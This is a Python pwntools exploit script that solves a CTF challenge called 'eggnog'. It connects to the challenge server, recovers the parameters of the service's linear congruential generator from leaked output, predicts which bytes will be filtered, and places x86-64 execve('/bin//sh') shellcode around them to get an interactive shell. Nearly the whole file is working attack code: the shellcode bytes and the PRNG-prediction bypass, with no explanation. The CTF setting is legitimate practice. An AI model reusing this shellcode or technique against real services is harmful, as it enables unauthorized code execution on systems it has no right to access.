from pwn import *
import gmpy2

context.log_level = "debug"

def gcd (a,b):
	if (b == 0):
		return a
	else:
		return gcd (b, a % b) 

p = remote('challs.xmas.htsp.ro', 12010)

code = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + '\x90'*(45-24)
p.sendline('A'*45)
p.recvuntil('Filtered eggs: ')
array = p.recvuntil('\n')[:-2]
s = array.split(' ')
t = []
u = []
p.recvuntil('(y/n)')
p.sendline('n')

for i in range(len(s)):
	s[i] = int(s[i])

for i in range(len(s)-1):
	t.append(int(s[i+1])-int(s[i]))

for i in range(len(t)-2):
	a = t[i+2]*t[i]
	b = t[i+1]*t[i+1]
	u.append(abs(a-b))

res = u[0]
for c in u[1::]:
	res = gcd(res, c)	

# lcg_state = (c + lcg_state * m) % n;
n = res
m = (s[1] - s[2])*gmpy2.invert(s[0]-s[1], n)
m = m%n
c = s[1]-m*s[0]
c = c%n

lcg_state = s[-1]
removal = []
for i in range(14):
	lcg_state = (c + lcg_state * m) % n 
	removal.append(lcg_state%len(code))

new_code = ''
count = 0
for i in range(45):
	no = True
	for j in removal:
		if j==i:
			new_code += '\xff'
			no = False
			break
	if no:
		new_code += code[count]
		count += 1

p.recvuntil('What eggs would you want to use for eggnog?')
p.sendline(new_code)
p.recvuntil('(y/n)')
p.sendline('y')				

p.interactive()

